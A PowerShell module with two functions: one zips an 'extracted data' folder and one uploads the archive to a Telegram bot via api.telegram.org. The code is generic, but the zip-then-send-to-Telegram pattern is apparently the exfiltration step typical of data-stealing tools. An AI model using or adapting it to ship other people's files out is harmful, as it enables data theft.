function Compress-ExtractedData {
    param (
        [string]$SourceFolder,
        [string]$ZipFilePath
    )
    Write-Host "Compressing extracted data..."
    Compress-Archive -Path "$SourceFolder\*" -DestinationPath $ZipFilePath -Force
}

function Send-TelegramFile {
    param (
        [string]$botToken,
        [string]$chatID,
        [string]$filePath
    )

    if (-not (Test-Path $filePath)) {
        Write-Host "The file $filePath does not exist. Skipping file send."
        return
    }

    Write-Host "Sending zip file to Telegram..."

    $uri = "https://api.telegram.org/bot$botToken/sendDocument"
    $multipartContent = [System.Net.Http.MultipartFormDataContent]::new()

    try {
        Write-Host "Opening file stream for $filePath..."
        $fileStream = [System.IO.File]::OpenRead($filePath)
        if ($null -eq $fileStream) {
            throw [System.Exception] "Failed to open file stream for $filePath"
        }

        Write-Host "Creating stream content for $filePath..."
        $fileContent = [System.Net.Http.StreamContent]::new($fileStream)
        if ($null -eq $fileContent) {
            throw [System.Exception] "Failed to create stream content for $filePath"
        }

        Write-Host "Setting content disposition for $filePath..."
        $fileContent.Headers.ContentDisposition = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new("form-data")
        $fileContent.Headers.ContentDisposition.Name = '"document"'
        $fileContent.Headers.ContentDisposition.FileName = '"' + [System.IO.Path]::GetFileName($filePath) + '"'
        $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("application/octet-stream")

        $multipartContent.Add($fileContent)

        Write-Host "Creating HTTP client..."
        $httpClient = [System.Net.Http.HttpClient]::new()
        Write-Host "Sending POST request to Telegram..."
        $response = $httpClient.PostAsync($uri, $multipartContent).Result

        if ($response.IsSuccessStatusCode) {
            Write-Host "File sent successfully to Telegram"
        } else {
            Write-Host "Failed to send file to Telegram: $($response.StatusCode)"
            Write-Host "Response: $($response.Content.ReadAsStringAsync().Result)"
        }

        Write-Host "Closing file stream..."
        $fileStream.Close()
        Write-Host "Disposing HTTP client..."
        $httpClient.Dispose()
    } catch {
        Write-Host "Exception occurred while sending file to Telegram: $_"
    }
}
Export-ModuleMember -Function Compress-ExtractedData,Send-TelegramFile
